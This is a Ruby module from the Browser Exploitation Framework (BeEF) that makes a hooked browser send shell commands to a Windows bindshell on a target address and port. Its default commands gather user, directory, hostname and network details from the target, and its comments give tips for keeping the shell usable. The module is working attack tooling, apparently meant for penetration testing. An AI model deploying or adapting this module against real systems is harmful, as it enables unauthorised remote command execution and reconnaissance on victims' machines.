#
# Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
=begin
The bindshell is closed once the module has completed. This is necessary otherwise the cmd.exe process will hang. To avoid this issue:
	- use the netcat persistent listen "-L" option rather than the listen "-l" option; or
	- remove the "& exit" portion of the JavaScript payload. Be aware that this will leave redundant cmd.exe processes running on the target system.

Returning the shell command results is not supported in Firefox ~16+, IE, Chrome, Safari and Opera as JavaScript cannot be executed within the bindshell iframe due to content-type restrictions. The shell commands are executed on the target shell however.
=end

class Inter_protocol_win_bindshell < BeEF::Core::Command
  
  def self.options
    return [
	{'name'=>'rhost',   'ui_label'=>'Target Address', 'value'=>'127.0.0.1'},
	{'name'=>'rport',   'ui_label'=>'Target Port',    'value'=>'4444'},
	{'name'=>'timeout', 'ui_label'=>'Timeout (s)',    'value'=>'30'},
	{'name'=>'commands','ui_label'=>'Shell Commands', 'description'=>'Enter shell commands to execute. Note: ampersands are required to seperate commands', 'type'=>'textarea', 'value'=>'echo User: & whoami & echo Directory Path: & pwd & echo Directory Contents: & dir & echo HostName: & hostname & ipconfig & netstat -an', 'width'=>'200px' }
    ]
  end

  def post_execute
    content = {}
    content['result'] = @datastore['result'] if not @datastore['result'].nil?
    content['fail']   = @datastore['fail']   if not @datastore['fail'].nil?
    save content
  end
end
